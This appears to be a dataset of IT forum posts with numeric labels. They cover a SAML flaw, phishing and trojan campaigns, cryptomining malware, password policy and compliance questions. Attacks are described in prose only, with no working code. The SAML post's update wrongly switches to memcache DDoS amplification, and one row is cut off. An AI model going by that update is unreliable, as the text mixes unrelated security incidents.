2116596,Use SSO?  SAML Vulnerability Found,"Bleeping Computer is reporting that researches at Duo Security and US-CERT have found a vulnerability with SAML that can allow an attack to sign into a victim account without knowledge of the password.  This vulnerability targets SAML (Security Assertion Markup Language), which is most importantly used in single sign on applications.The flaw is how these libraries handle XML comments inserted in the middle of a SAML response request. For example, researchers have noticed that if an attacker inserts a comment inside the username field in such a way that it breaks the username, the attacker might gain access to a legitimate user's account.Know that this vulnerability doesn't affect all SSO vendors that use SAML, nor does it affect them in the same way.  Below are steps to consider to handle this vulnerability.  Researchers recommend disabling public registration of user accounts on sensitive networks and vetting each user manually to avoid attackers registering an account on internal networks in the first place.If this is not possible, network admins can configure a whitelist of accepted email address domain names to limit who can register on the network, albeit this is not a reliable protection measure and a  determined attacker will find a way around it.You can see Duo's report here:https://duo.com/blog/duo-finds-saml-vulnerabilities-affecting-multiple-implementationsI'll update this post once US-CERT posts their report.Update:US-CERT has issued their report, which not only talks about this, but UDP based DDoS attacks in general.  https://www.us-cert.gov/ncas/alerts/TA14-017AThe reason why this is a big issue is just how much amplification memcache adds to this attack, up to 51,000 times the data is sent as received in the best (worst) case scenario.",0
1983182,Firewall Rule management/documentation,"Hey All,Curious what you guys do for firewall rule management and documentation?  I've looked at a few pieces of software like Red Seal but it's quite expensive and I'm not sure what I really need VS what some of these do.  I don't need compliance checking, just trying to get a good list/visual of what rules I have in place.  I was thinking about using Excel but thought there had to be a better way.We use a SonicWALL at this time, no managed switches but that will change in a few months.Thanks!",5
444692,TeamViewer Installed on Server,"I just received a Spiceworks notification that TeamViewer has been installed on our server, however I cannot find it on the server. We run Windows Server 2003 and I've checked the running Processes,  Add Remove Programs, Services and Manually in the Programs folder. I'm also doing a search on the system now. I don't know how it would have gotten installed unless we've been compromised somehow. Anyone know of where else to look for a TeamViewer install?",5
366598,New ASA Site-To-Site: One-Directional Traffic,"I'm sort of new to Cisco devices, though especially with L2L\S2S VPNs.

2162357,Compliance Rush: Five Mistakes that Can Screw Your Company,"In April 2018, shortly before the GDPR came into force, IDC reported that only 29% of small businesses and 41% of midsize businesses in Europe had taken steps to prepare for the regulation. Now the GDPR has been around for some months, but many organizations are still struggling to meet their compliance obligations. One recent example is British Airways, which revealed last week that the personal and financial data of more than 380,000 customers had been breached. If the airline is found to be in violation of the GDPR, they could face a fine of four percent of their annual global revenue — whether you’re counting in British pounds, Euros or U.S. dollars, such a fine would likely have at least 7 digits.The protection of personal data is becoming more of a priority in the U.S. as well as in the EU. The new California Consumer Privacy Act of 2018, which goes into effect in 2020, is just one of what are sure to be many more regulations developed to protect personally identifiable information.Therefore, if your organization is still not prepared to meet the compliance requirements you’re subject to, you definitely need to get moving. As you develop your strategy, be sure to avoid these common mistakes that can harm your company:Mistake 1: Compliance obsessionWith compliance challenges in the headlines every day, it’s easy to run mad and make bad decisions. The most absurd example might be British airline Flybe:  In their eagerness to prepare for the GDPR, they crafted an email advising users to update their personal information and marketing preferences and sent it their entire customer base — including people who had unsubscribed from the company’s emails. That rash action violated an existing law, the Privacy and Electronic Communication Regulations (PECR), and got the company slapped with a £70,000 fine.If you’re unsure about how to meet compliance requirements, don’t do anything in haste. Seek council from legal advisors and other experienced consultants before taking action. Prioritize your efforts. And keep in mind all the compliance standards you are subject to, so you don’t violate one as you try to comply with another.Mistake 2: Taking a fragmented approach to securityThe GDPR and many other compliance regulations require a comprehensive approach to security that involves not just technology, but also governance, processes and people. However, a recent Forrester report found that 26% of EU firms that claim to be GDPR-compliant are focusing too heavily on IT measures to meet only specific GDPR requirements, such as consent or data breach notification.Taking superficial measures isn’t an effective way to protect your organization from security incidents and audit penalties. I urge you to see the GDPR and other new legislation as an opportunity to get back to the basics that will improve cybersecurity across your IT infrastructure. In particular, make sure you know where your sensitive data resides, who has access to it, and which services and software are the most critical for your business.Mistake 3: Being reactive rather than proactiveMost compliance regulations require a proactive approach from your IT department, which is notoriously hard to put into practice. During a recent presentation IT security professionals, I did an informal survey about how proactive they consider themselves to be. It turned out that 80% of them are reactive to new compliance requirements and lack a long-term strategic approach.If your IT department is overwhelmed by routine troubleshooting, it won’t be able to prevent data breaches, respond promptly to requests to be forgotten, or comply with other requirements of data protection regulations like the GDPR. Try to figure out the root of the problem: Is your department understaffed or lacking the expertise you need? Are your security systems insufficient or poorly managed? Are employees unaware of proper security protocols? Each answer requires different actions, so find the root cause first.Mistake 4: Putting responsibility on IT onlyAt the same time, the worst thing you can do is to blame your IT people for compliance failures. In practice, if a data breach occurs, the problem often lies outside of IT department. The Netwrix IT Risk Report found that 65% of organizations have experienced security incidents, and most were due to human errors and malware. You don’t want to get fined because someone copied a file with customer’s ID to his laptop or clicked on a malicious link that delivered ransomware, so make sure all employees who deal with sensitive data (such as your marketing, sales, accounting and legal teams) are trained on your cybersecurity policies and procedures. Make sure your educational efforts go beyond boring lectures about security — include relevant case studies and edutainment programs. More broadly, work to establish a new business culture that puts security and personal data privacy at its center.Mistake 5: Being too radicalRichard Stallman, president of the Free Software Foundation, has suggested that, instead of protecting and regulating personal data, we should ban its collection. I personally know of companies that have deleted all customer data that could be considered sensitive to try to eliminate the risk of GDPR fines.These responses aren’t just radical; they’re also ineffective. Getting rid of your customer database won’t erase your obligation to report to auditors; it will just hurt your ability to be competitive. Auditors will be looking for a credible plan to ensure compliance, so make sure you can demonstrate them you are on the right path to better control your security. As for your customers, respecting their privacy and preferences will increase their loyalty. You could easily lose a client who has been with your company for years if you don’t treat him according to his preferences because you ditched all information about him.For too long, businesses have been collecting personal data from customers to meet their own revenue goals. Now it’s time to recognize the rights of data subjects and become privacy-friendly. The scope of this change might seem daunting, but your customers will reward you with stronger loyalty. Plus, if you address compliance as a strategic business challenge, you’ll be in good shape when the next piece of compliance legislation comes around; you’ll have a simple reporting issue, not a fundamental engineering task, on your hands.",11

350952,Managing passwords for VPN users,"My user base includes about 40 remote or mobile users with laptops, and after some recent changes, password resets are becoming a serious headache.  All remote users have domain connected PCs, and their VPN connection also uses their AD credentials for the connection (this is the recent change, old VPN didn't use AD credentials).  The VPN connection doesn't support password resets, so if a user's password expires, they cannot connect to reset their password and have the new password sync to AD, so they're stuck in a catch 22.  Anyway, I've been trying to find a way around this problem, and have found a couple possible solutions that I'm hoping others have used and can comment on. My main needs for these tools are the following:improved notification as a password nears expirationability for user to change expired password while not connected to the VPN, thus allowing them to connect again Netwrix' Password Manager and Synergix ADCE both look like they'd work for this purpose, but they aren't cheap and I'd like to get some feedback from current users of these tools.  Do they work for you, and are they worth the costs?",0

407525,Bit coin mining malware,"Just a heads up as this is getting around.I have a system I built myself and added an nVidia GTX 550 Ti video card. I keep the drivers up to date regularly, but had noticed that I had to dumb down the settings in Splinter Cell and a couple of other games. Never having a good graphics card before I was used to this and thought I needed the latest and greatest to run with full graphics. As I was randomly going through system logs I had noticed a few entries that indicated that my GPU was thrashing. Also when I would watch a movie with subtitles, the video would stutter badly, making it un-watchable. Turn off subtitles and all was good.So I updated to Windows 8.1 recently and was browsing around some of the new features when I happened upon Task Manager and saw an unnamed process sucking 25% of my CPU. Alarm bells went off so I killed the process and the video driver crashed, but recovered. As the process was unnamed it was hard to trace. Eventually I saw it pointed to svchost.exe but in my temp folder. Strange, I thought, why is a windows process running out of a temp folder?Also I was only using the built in security of Windows 8. So I installed MalwareBytes and scanned. It found that file pretty fast, but couldn't clean it up. So I installed Avast! AV and that did clean it up after a couple of reboots.Now I can game with full graphics and subtitles work just fine. This has been an issue for me for about 6 months! So some a$$hole was mining bit coins with my GPU cycles.In summary, don't trust Windows Defender as your sole anti virus. Lesson learned!",11

611814,Fake Dropbox login page attempts to steal credentials for popular email services,"Greetings one and all!  A couple days old here, but still good intel.  Our Man Nick Johnston dropped a blog on Friday about a new Dropbox scam.  Dig it:Dropbox users targeted by phishing scam hosted on DropboxIn March 2014, we blogged about how Google Docs and Google Drive users were being targeted by a sophisticated phishing scam. In this scam, messages included links to a fake Google Docs login page hosted on Google itself.We continue to see millions of phishing messages every day, and recently we saw a similar scam targeting Dropbox users. The scam uses an email (with the subject ""important"") claiming that the recipient has been sent a document that is too big to be sent by email, or cannot be sent by email for security reasons. Instead, the email claims, the document can be viewed by clicking on the link included in the message. However, the link opens a fake Dropbox login page, hosted on Dropbox itself.The fake login page is hosted on Dropbox's user content domain (like shared photos and other files are) and is served over SSL, making the attack more dangerous and convincing.The page looks like the real Dropbox login page, but with one crucial difference. The scammers are interested in phishing for more than just Dropbox credentials; they have also included logos of popular Web-based email services, suggesting that users can log in using these credentials as well.After clicking ""Sign in,"" the user’s credentials are sent to a PHP script on a compromised Web server. Credentials are also submitted over SSL, which is critical for the attack's effectiveness. Without this, victims would see an unnerving security warning.Upon saving or emailing the user's credentials to the scammer, the PHP script simply redirects the user to the real Dropbox login page.Although the page itself is served over SSL, and credentials are sent using the protocol, some resources on the page (such as images or style sheets) are not served over SSL. Using non-SSL resources on a page served over SSL shows warnings in recent versions of some browsers. The prominence of the warning varies from browser to browser; some browsers simply change the padlock symbol shown in the address bar, whereas others include a small banner at the top of the page. Users may not notice or understand these security warnings or the associated implications.Symantec reported this phishing page to Dropbox and they immediately took the page down. Any Dropbox-hosted phishing pages can be reported to the abuse@dropbox.com email address.Symantec Email Security.cloud as well as Symantec Messaging Gateway and Symantec Messaging Gateway for Service Providers customers were protected from this threat.﻿﻿",11
2145352,"Sophos, Fortinet, PA firewall- which is easiest for SB?","I know there are a lot of comparisons between these already (and I've read through most of them) but what I'm wondering is in terms of setup and management only (cost not a consideration) which would be easiest for the non-expert (i.e. someone who wears lots of other hats besides the IT)? Does one stand out from the others? This is in the context of a small business, and if it helps to have specific models, assume the Sophos, XG-105, Fortigate 30E, and PA-220.  Thanks for any thoughts on this.  This forum has been a great resource, and I've learned a lot from it.  ",5
2187804,The Ins-and-Outs of Package Management,"It’s hard to remember a time before package managers. A time when software arrived on a set of floppy disks in the mail or a compact disc in the back of a catalog. A time when finding software online meant visiting a half-dozen shady websites that may or may not have been responsible for the three thousand search bars installed on your web browser. A time when you had to just trust the integrity of software distributors, because what other choice did you have?Okay… maybe it’s not that hard to remember.Finding and installing new software used to be such a chore that the concept of real-time patching for consumers was laughable. What company could afford to deliver minor updates to consumers in a timely manner? For that matter, how could they incentivize users to even install those updates? As internet speeds increased, and access became more ubiquitous, many software vendors built out proprietary solutions for delivering software updates to consumers, but each solution was a singular effort, resulting in dozens of programs on one machine all running their own remote update procedures.It was hardly sustainable.Enter The Package ManagerAnd then, in 2008, Apple introduced the iPhone App Store and permanently changed the public expectation of software distribution into what it is today. While not even close to being the first package manager in existence, the simplicity of Apple’s App Store was what popularized the concept of package managers for consumers, and ultimately paved the way for other devices and operating systems to distribute software packages in a similar manner. What this shift in expectations resulted in was a merging of resources. Now, instead of every software manufacturer being forced to create their own patching solutions (if they chose to create one at all), software updates and patches are delivered in a consistent, reliable—and most importantly, efficient—manner.“That’s great,” you might be thinking, “but what exactly is a package manager?”At its core, a package manager does exactly what its name implies: it manages packages installed on a particular device. From installations and uninstallations to updates and configurations, package managers are responsible for ensuring that your software is up-to-date and in the state it is supposed to be in. Additionally, package managers also protect consumers by vetting and verifying the integrity and provenance of software packages and their updates, which means no more discs in the mail or semi-trustworthy websites.Types of Package ManagersWhile there are quite literally hundreds of package managers in the wild, they can generally be broken down into two categories: native package managers and third-party package managers.Native Package ManagersNative package managers—you might have heard them called “app stores” before—are so named because they are generally shipped with their host operating system. Because of their close association with the host operating system, the packages within these package managers are intended to have received the highest level of scrutiny, and while there have been widely publicized incidences of native package managers serving up not-so-friendly applications, they are generally the most trusted by consumers.While the “app store” moniker is one that is most associated with smartphones, thanks to Apple, the terminology is one that has been borrowed in some form or another by nearly every operating system available to consumers today. The iPhone and Mac operating systems have the App Store, Android has the Play Store, Microsoft Windows has the Windows Store, and even Linux distributions have their own solutions like the Ubuntu Snap Store that are powered by their respective command-line package managers.The “app store” concept has not only simplified the software installation and patching workflows for everyday users, it’s actually improved software discovery. With just a little bit of effort, users are more capable than ever of finding high-quality, safe solutions for their daily computing needs. No longer having to rely on word-of-mouth and hours of agonizing research, every-day computer users can find and try new software at the click of a button, which is something that was practically unthinkable two decades ago.Third-Party Package ManagersIf native package managers are built for the every-day user, third-party package managers are built for the power users. Created to ease the management of package that can’t be found within native package managers, third-party package managers provide the same functionality but with much larger catalogues. From Homebrew on macOS to Chocolatey on Windows (and yes, even Linux has solutions like Linuxbrew), these package managers—as the name implies—are built by third-parties, and serve up third-party software.In addition to the types of user-friendly packages that can be found in native package managers, third-party package managers also often include more advanced packages like software development tools, making them particularly popular amongst programmers. It’s worth noting that, while the packages that wind up in these third-party package managers do receive some vetting, it’s not nearly as stringent as the vetting performed by native package managers, so trust is something that can be more difficult to earn.Package Delivery, Sign Here PleaseRegardless of the type of package manager, their end goal is the same: to deliver and install software and patches to their host. But how exactly do they accomplish that? Generally speaking, packages are delivered in one of two formats: binary and raw. Now, while there is no major benefit to the consumer in using one of these package types over the other, it is often an indication of the type of licensing associated with each package.Binary PackagesBinary packages are pre-compiled binaries that are delivered to their target operating systems, no compilation required. These packages are generally closed source, and can most often be found via the app stores in Windows and macOS (however even third-party package managers like Homebrew and Chocolatey will deliver binary packages when asked).Raw PackagesRaw packages, on the other hand, are delivered “raw,” source code and all. These packages are often open source and are compiled directly on the host system, by the host system. While the native package managers on Windows and macOS do not deliver raw packages, nearly every third-party package manager—and even Linux-based native package managers—deal with raw packages most often.Package Management for Software DevelopersWhile not technically within the scope of this article, it’s worth mentioning that package management isn’t limited solely to software delivery. Factor II of The Twelve Factor App states that “a twelve-factor app never relies on implicit existence of system-wide packages. It declares all dependencies, completely and exactly, via a dependency declaration manifest.” What this statement means is that software developers should manage application dependencies through the use of a packaging system, such as CPAN for Perl, Rubygems for Ruby, or Composer for PHP (to name a few). This allows developers to isolate, install, and patch dependencies that their applications rely on, which in turn ensures a more stable, secure product.Trusting TrustLet’s face it, package managers make the lives of consumers better, but they aren’t the only way to install and update software. With manually downloadable binaries and proprietary update channels still being popular methods for delivering applications, there is still a component of trust that must be won; but when can you really trust a software vendor? Security breaches in the software delivery chain are not unheard of and have resulted in malicious packages being downloaded and installed by unsuspecting users in the recent past. In the next article of this series, we will look at how software repositories and download pages have been successfully used as attack vectors, and discuss what (if anything) consumers can do to protect themselves.If you like this story, visit the Automox blog for more cybersecurity news.",12
161762,Is our network haunted? Mysterious system admin account.,"We have a few system administrator accounts on our system, some are for us and some are for software and whatever automated processes. Most of these have been here since before I was here and so I've never really delved into them but we also have a weird account called 'brian'. All of the other accounts have a name which bears some clues as to the purpose of it but this one is a little more peculiar as we randomly find that it logged into our forest root and having disconnected but not logged out. It's a pretty old network and I don't want to delete it only to find that it powered some old piece of software that gets needed a lot (I work in a school and when some vital piece of software doesn't work in the middle of an assembly I get it in the neck). There's also some pretty archaic financing software and such that 'just works' so I don't get too involved with it but is used all day by some of the admin staff.It's a funny little account, it doesn't have an email address set up which should be done automatically when accounts are created on our system, it also looks like it has never logged on to a client machine judging by all the initialization stuff that happened just now when I was making guesses at the password, and it also has a password that is one of our defaults. I've asked the previous system administrator for this place when he was still here but he didn't seem too interested, not sure if he had something to hide or if it was one of those things where he knew it was used for something, couldnt' remember, and wasn't interested in trying to remember.Anyone heard of a piece of software that uses an account called 'brian'?",0
2064051,Teamviewer Quick Support = scary,"I wanted to be able to remote into mobile devices to help people fix their phone issues... With iOS11 and new Teamviewer capabilities, I did some sandbox trials. Holy shit was it scary; overall pretty interesting though.Android: Once I obtained a code, I was able to wake up the device, input my phone's PIN, and proceed on through to control the device... I had thought that for security reasons, an app wouldn't be able to have that kind of control over a lock screen. Basically just give up your code on your phone, and the person on the other end has all control once you press allow. That is just asking for trouble if you're Teamviewer. Overall this is 100% convenient, 0% security.iOS: This is a lot more on the security focus, and less on convenient. About 20% convenient, 80% security. You have to go into Settings > Control Center > Screen Recording > Teamviewer Quick Connect > click to enable. Then you have to swipe up from your bottom drawer > long press Screen Recording > select the notification with your Teamviewer ID > relay that ID > accept the connection. Only after that point, can the person view your session. Key word is 'view'. At no time can the viewer take control of the non-jailbroken device. Bottom line... I use and love Android devices because of the amount of control I can decide that is right for me, but you can get to a scary amount of control (because it is up to me). With iOS, I'm glad to see Apple getting out of the security bubble to maintain a little more security-convenience balance. All in all, pretty cool if you like Teamviewer. But as all SpiceHeads know, you don't use Teamviewer so I am immediately raking this sandbox.",0

1776003,"Clinton Foundation Gets Spear-Phished By Russians, Hires FireEye To Investigate","REUTERS just reported that the Clinton charitable foundation hired the security firm FireEye to examine its network after seeing indications they might have been hacked by Russians, according to two sources familiar with the matter.One of the sources and two other U.S. security officials told the news agency that the hackers used spear phishing to get access to the foundation’s systems, just like the Democratic National Committee, Hillary Clinton’s presidential campaign and the party’s congressional fundraising committee. It is highly likely that they have penetrated the RNC and the Trump campaign as well, and know exactly what is going on there in great detail.The hackers used the same social engineering tactics as Russian intelligence agencies or their proxies used against the Democrat groups, which looks like a clear indicator that Russians also targeted the Clinton Foundation. Russia has of course denied allegations it was involved in the hacks. Putin is a KGB spook, and you know the expression: once a spook, always a spook. That is not a world you can escape from alive.The Clinton Foundation has not commented on the report. FireEye told Reuters they don't comment on its clients.It's a good idea if you are at the top of an organization to set a good example. Especially in politics it is a good idea to apply the policy of setting a good example, because if you don't the fallout can be severe. Here is a well-documented example of a politician not following their department policy of taking regular security awareness training courses, and I am sure she is not the only one. This is a short quote from the dailycaller site 10/1/2015:""Glaring shortcomings in cyber-security training throughout the State Department on former Secretary Hillary Clinton’s watch reflected a pervasive anti-security “culture” she encouraged there, according to multiple former intelligence and military officials.Acting State Department Inspector General Harold W. Geisel issued six critical reports that charged top officials did not submit themselves to the department’s mandatory “security awareness training” during Clinton’s tenure. The training covers procedures for properly handling of sensitive and classified government documents and how to secure digital communications.Well, if you have a good security technology but you don't use it, sooner or later it will bite you in the behind.

404941,PNC Bank says our user's PC has a virus,"I just recieved a frantic call from our company treasurer. She was trying to log into her PNC bank account and it was locked out. She recieved a phone call from PNC support stating that they detected 2 viruses on her computer. She was instructed to call regular PNC customer service and give them a support ticket number and they would walk her through remediation.This was at the end of the day so I'll have to tackle this first thing in the morning.Some background:I was given a call this morning about a suspicious email she had opened the attachment to. When I took a look it was a .zip file voicemessage.zip with a voicemessage.exe inside the folder. She said she opened it but it is unclear if she opened the exe or the zip folder.Since this is the second user at our office this week with this same issue, I ran a full Malwarebytes scan but didn't detect anything. The last time I was able to detect 3 .exe backdoor trojans. Later on in the day VIPRE ran a scheduled deep scan and caught budha.exe trojan on the PC and quarantined it. Not sure how Malwarebytes missed that, must have been a morphed trojan.By the end of the day I thought her PC was ok so I left work only to be called about this issue with PNC.So a few questions:1. Now I'm suspecting some sort of keylogging attack, does that sound about right?2. How did the bank know she had 2 viruses on her computer? I don't think the bank virus scans each computer that logs into its website.3. Any suggestions for when I get back to the office in the morning?

368880,We started trusting bad code from Day One,"The Internet really still is in beta.Vint Cerf, who together with Bob Kahn created TCP/IP, the protocol that routes Internet traffic, is often called the ""father of the Internet"". Cerf was interviewed about TCP/IP recently in a book called Fatal System Error and admitted “We never got to do the production engineering.” In software design language that essentially means ""we never got out of beta"".Cerf explained: “My thought at the time, thirty-five years ago, was not to build an ultra-secure system, because I could not tell if even the basic ideas would work."" The focus at the time, as it was an Arpanet Defense project, was on fault tolerance, not security. The message was supposed to automatically reroute around atomic bomb blast sites, not protect you against identity theft or keep hackers out of your network.Cerf has stated many times over, the only way the Internet is going to be truly secure is to rebuild it from the ground up. That is difficult, but can it be done? Absolutely. But it's going to take agreement, a lot of time, and a lot of money. And looking at the state of the planet, it's doubtful if it will ever be done. Especially as some powerful players prefer things to stay as they are because they are in control now.How did it get to be this bad?There actually are security technologies that are far superior to what is being used today. So how come they are not being deployed in production? The answer has to do with people, not technology.  Hackers and the NSA are far ahead in their offensive technology, they can essentially break into any piece of code. And then there is that pesky end-user. Machine-to-machine communications are easy, but once you throw in hundreds of workstations, dozens of servers, and thousands of devices and apps that are being driven by humans, things get very hairy, very quick.  Fancy mathematical security algorithms start to break down or get overwhelmed.The old way does not cut it anymoreRemember the old days when security standards were created by a large body of experts? Government and large companies threw resources at it, and 24-36 months later we had a new standard.  But now, with large amounts of money being paid for 0-day vulnerabilities, hackers make security standards obsolete before they come out. The game has changed completely.The new way is not here yetYou have to understand that there is a fundamental difference between cybersecurity and almost any other technology. The more people know about cybersecurity, the less secure you are. People have a choice to become a white hat or a black hat, and at the moment the dark side pays a lot more. Continuing to fix vulnerabilities with regular patching is at best a Band-Aid and an expensive one at that. There is always the risk that a hacker will get into your network before you can apply the patch. Not to mention 0-day vulnerabilities where there simply is no patch.""Pay me now or pay me later""You know the saying, and the time has arrived to pay the piper. For well over 40 years we have trusted code that was not designed to be secure. It has caught up with us, and it is time to start using defensive technology that will keep attackers truly out. It begins with a good look at your defense-in-depth and at the very least becoming a hard target to penetrate. Personally I would look at Application Control (a.k.a. whitelisting) and of course immediately start with security awareness training as it's end-users who are the low-hanging fruit that hackers use to break into your network with their social engineering tactics.",12

442367,Don't fall for the latest Paul Walker email about the Viper GT,"A fine good day to all Citizens of the SpiceI know that I have seen this email, and now we have word from Symantec Sr Threat Analyst Joseph Graziano (formerly of MessageLabs) that it is bad news.  Take a look:﻿Paul Walker’s Death Used to Spread Personalized Trojan Horses﻿﻿It was only a few months ago that Paul Walker that left us in a fiery car accident. These days it is common for spammers and malware writers to use a celebrity’s death to spread malware. In this case, it started with emails with links to a video of Paul Walker’s car on fire, but instead contained a link to a malicious file.In the latest slew of emails, the sender makes a plea to the victim to find a Dodge Viper GT that was supposedly racing with Paul Walker’s car. The email asks that anyone with information call a number in the email or open the attached file to view a picture of the Viper GT’s driver. In every sample we have dealt with there is always a promise of reimbursement or compensation for helping capture the Viper GT’s driver.These attacks are unique because of the regular change of subject lines and body text to bypass spam filters. The attacker tries to personalize the email with the recipient’s name in the body, subject, or attached file name.Each executable file is made specifically for the email address it is sent to and is compiled just before the email is sent. The sender’s email address is always an aol.com email account that has most likely been hacked or otherwise compromised. Whenever a user is compromised, their address book is harvested to continue the chain of personalized emails.Figure 1. Email about Paul Walker’s death with malicious attachment from January 30, 2014Figure 2. Email about Paul Walker’s death with malicious attachment from January 31, 2014Once the malicious file has been executed an error notification is sent indicating that a  32-bit or 64-bit computer is needed to run the file. It may also indicate that the user does not have sufficient permissions to run the file even though the malware continues to run in the background.  The Trojan will start to perform DNS queries through a list of domains with similar names until the malware gets a DNS query return and then it will connect to that URL to download a file into the following directory:""%UserProfile%\Application Data\amhldfbyjmg\kskzjmtypb.exe”Once the file (kskzjmtypb.exe) is downloaded, it runs and connects to p9p-i.geo.vip.bf1.yahoo.com to download qr1aon1tn.exe. When this runs, it drops the following file:""%UserProfile%\Application Data\amhldfbyjmg\fdxeuzv.exe”Symantec detects this malware as Trojan Horse.Symantec advises users to be on their guard and to adhere to the following security best practices:Exercise caution when receiving unsolicited, unexpected, or suspicious emailsAvoid clicking on links in unsolicited, unexpected, or suspicious emailsAvoid opening attachments in unsolicited, unexpected, or suspicious emailsKeep security software up-to-dateUpdate antispam signatures regularlySymantec constantly monitors spam attacks to ensure that users are kept up-to-date with information on the latest threats.﻿Scumbags out there will do anything to get our attention, especially if they can capitalize on a newsmaking celebrity death.  Don't get caught by this one.",0

1537219,Tech Tactics: Password policy best practices — where's the data?,"After a recent audit (financial, not IT) the non-IT auditor presented us with a set of suggested password policies. Looking over the suggestions, I wondered where they came from. Were they based upon evidence that they worked, or were they just rules that seemed like they should work? It seems like you can find an endless supply of password rules and suggestions: minimum 12 characters — some say more, some say fewer; use of multiple character sets; 60-, 90-, or 120-day password changes; etc. But these rules strike me as arbitrary despite the force and confidence with which people make the suggestions. No one cites any evidence as to why any given policy is a particular way or whether it has been measured in real-life situations. Are they just made up and passed around? Do people just accept them because so many others are implementing them?Here are some theoretical strategies and the attacks they attempt to thwart:Password length, designed to thwart brute force attacks. The longer the password, the more computing power and time it takes to crack.Internal threatsMost of the suggestions of password rules seem to address cracking attempts in which an attacker is using an automated method to crack a password file. But what about internal threats to an on-premises Active Directory network with respect to passwords? For instance, internal hacking where someone sits at a workstation trying to guess a user's password or perhaps spots a password on a sticky note, someone getting the password file for offline cracking, social engineering, key logging? How frequently are they employed in the real world?All of the suggestions about password length and complexity are rendered moot in the face of discovered sticky notes, social engineering, and key loggers. Training should be able to address the sticky notes and social engineering, and strong network security can lower the risk of key loggers — but here again I am relying on intuition rather than systematically collected data. Password complexity, designed to thwart brute force attacks. The more diversity in character sets (using capitalization and special characters), the more computing power and time it takes to crack.Non-dictionary words, designed to thwart dictionary attacks. If it isn't in a dictionary, it can't be cracked using this method.Non-dictionary words and substituting some letters with numbers, but not obvious numerical substitutions like switching a 1 for an I, designed to thwart permutation attacks. Permutation attacks use common passwords and dictionary words and also test for common numerical substitutions. Using non-dictionary words and unusual number substitutions theoretically interferes with this attack.No common letter or number sequences, designed to thwart dictionary attacks. Dictionary attacks can include commonly used passwords that employ letter and number sequences (such as abcdefg, 123456, qwerty).Limited number of password attempts, designed to thwart all automated cracking. If the system allows, say, five failed attempts before locking out a user, this renders all automated guessing ineffective, at least on a live system. If an attacker can download a password file for cracking on their own system, this method won't help.Securing or eliminating written passwords, designed to thwart on-premises attacks. Keeping written passwords locked in a file drawer rather than taped to a monitor can lower the possibility of someone on premises discovering credentials. Not using them at all is even better.No user information-based passwords (name, birthday), designed to thwart user information attacks. Attackers who try to guess passwords might incorporate personal information into their password guesses, as people sometimes use personal information such as birthdates or names of loved ones. Avoiding this practice can make password guessing harder.No password reuse, designed to thwart discovered old passwords. Changing passwords and not reusing past ones makes any old passwords useless no matter how they are discovered. If it takes a brute force method several months to crack a password, but the user has changed the password to something else in the meantime, then the attempt will have failed. The same holds for sticky notes found at the deskside or in the trash that contain a stale password.Show me the scienceThe research I have done in the last few weeks has led me to think that many sysadmins are adopting password policies that appear to work, but that might not be yielding the level of security desired. For example, it may seem like requiring a random string of complex characters (e.g. Goi&3Rtu89]) is a nice strong password policy (and it is, in a sense), but when one considers the likelihood of the user writing it on a sticky note pasted to their monitor, security is compromised. I think it would be great if we could quantify these efforts. I found a couple of studies that have attempted to do that. (I am sure there are many more. Post them if you know of them.)A paper entitled Rethinking Password Policies [PDF], published in 2013, suggests using passphrases of multiple words to address memorability and increased resistance to hacking due to phrase length. Memorability affects user acceptance and avoids reliance on pen and paper.In a study [PDF] from 2000, the authors found that mnemonic passwords based upon a phrase of the user's choosing (e.g. yltecp; from the first letters of ""you like to eat cheese pizza"") are as difficult for a brute-force attack to crack as the same number of randomly chosen characters. Further, the authors found that when users created such mnemonic passwords, the users remembered them better than users who were given a random string of the same number of characters. They concluded that since the security for both passwords is equal, using mnemonic passwords results in fewer calls to IT for password resets and possibly a lower likelihood of passwords committed to paper. They also demonstrated that allowing people to pick their own passwords with no guidance, compared to a group instructed on making a mnemonic password, resulted in the unguided group passwords being hacked much more readily. That's probably intuitive, but they demonstrated it with several hack types: dictionary, permutation, personal information, and brute force.My takeaway from this information is that in order to maintain security, users who want a password that is easy to remember should use a longer one, like a passphrase. If they want a shorter password, they need to make it more complex. In either case, they need to choose one that is easy for them to remember but hard for others to guess, and they should be given detailed guidance as to the construction of their password.Below are some password testing tools. Note that each tool uses different rules and tests different assumptions, which is part of the point of this article. KasperskyPassword MeterHow Secure is My PasswordNote: Don't enter passwords you actually use. These tools are designed to help you learn how differences in passwords affect their strength and how different rules result in different assessments of strength. Finally, here is a well-written Spiceworks post on this topic that I discovered as I finished this little screed. Increases in the sheer computing power available in the last few years, especially with GPUs, makes longer passwords even more important.If you know of good sources of information on these topics, please share them. I would like to crowdsource scientifically derived best practices for password policies, and the Spiceworks community is just the place to do it.Can you talk about how to tackle a common IT task in detail, with examples?

541415,Sophos UTM - plain text emails,We currently have Sophos UTM 9 on our network and plain texts that come through are attaching themselves as .dat attachments that contain the actual plain text content.I've checked the SMTP log and it appears the email in question is being successfully passed through... and the user is white listed so it doesnt look as though its a Anti-SPAM feature.I can only think that is is in some relation to encoding and the sophos box does not know how to deal with this.I think it most definitely is the UTM as this issue has only occurred since moving over to this particular box.Has anyone experienced any issues like this?Thanks,5
1223593,PCI Compliance confusion... Is this OS compliant?,"I am trying to finish our company's PCI self certification and I am coming across some gray areas that I could use some clarification on: Some of our older POS workstations are running Windows Embedded for Point of Service 1.0. I am looking into this OS, and I see that the mainstream support end date is 4/12/2011, and the extended support end date is 4/12/2016.  Does this mean that the OS is not PCI compliant unless we have extended support through Microsoft, or did MS extend support? And no matter what, it won't be PCI compliant as of April of next year, right? These POS terminals are 10 year old IBM's that have less than 128 MB of RAM, so they probably can't run POSReady 2009 or POSReady 7. The second thing I'm having trouble getting clarification on is TLS 1.0. According to PCI-DSS, TLS 1.0 cannot be enabled in your credit card processing network. Does the embedded OS support TLS 1.1 or 1.2? I can't seem to find a definitive answer.Thanks in advance for any information you have! ",0

